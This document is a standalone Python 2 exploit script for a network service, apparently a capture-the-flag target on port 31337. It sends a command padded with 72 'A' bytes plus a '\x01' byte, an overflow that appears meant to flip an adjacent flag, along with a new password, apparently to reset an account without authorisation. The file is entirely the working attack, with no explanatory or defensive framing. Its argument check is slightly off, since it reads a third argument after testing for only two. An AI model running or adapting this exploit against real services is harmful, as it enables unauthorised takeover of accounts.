#!/usr/bin/env python2

import socket
import sys

###############################
############### Client Class ##

class Client:
    def __init__(self, host='127.0.0.1', port='31337'):
        self.host = host
        self.port = port

    def send(self, command):
        cmdString = command[0]
        for e in command[1:]:
            cmdString +=  " " + str(len(e)) + e
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, int(self.port)))
        sock.send(cmdString)
        sock.setblocking(0)
        sock.settimeout(1.0)
        ret = sock.recv(4096)
        while ret != "":
            for l in ret:
                if l != None:
                    sys.stdout.write(l)
            ret = sock.recv(4096)
        sock.close()
###############################

###############################
################ Main Source ##


def main():
    if len(sys.argv) < 3:
        print("Usage :\n%s <host IP address> <port> newuserpassword" % sys.argv[0])
        sys.exit()
    try:
        client = Client(sys.argv[1], sys.argv[2])
	client.send(["0", (72)*'A'+'\x01', sys.argv[3]])
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()

###############################
